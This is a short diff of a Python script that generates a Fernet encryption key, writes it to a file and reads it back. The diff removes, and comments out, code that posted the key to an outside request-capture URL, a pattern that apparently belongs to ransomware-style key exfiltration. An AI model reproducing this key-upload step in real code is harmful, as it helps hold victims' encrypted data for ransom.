@@ -24,17 +24,16 @@ with open('filekey.key', 'wb') as filekey:
 
 with open('filekey.key', 'rb') as filekey:
     key = filekey.read()
-    url = 'https://ptsv2.com/t/zehuk-1648139130/post'
-    headers = {"Content-Type": "application/json; charset=utf-8"}
-
-    myobj = {
-        'key': str(key)[2:-1]
-    }
-
-
-    x = requests.post(url, json=myobj)
-    print(x.status_code)
-    print(myobj)
+    # url = ''
+    # headers = {"Content-Type": "application/json; charset=utf-8"}
+    #
+    # myobj = {
+    #     'key': str(key)[2:-1]
+    # }
+    #
+    #
+    # x = requests.post(url, json=myobj)
+    # print(f' POST request: {x.status_code}')
 
 fernet = Fernet(key)
 
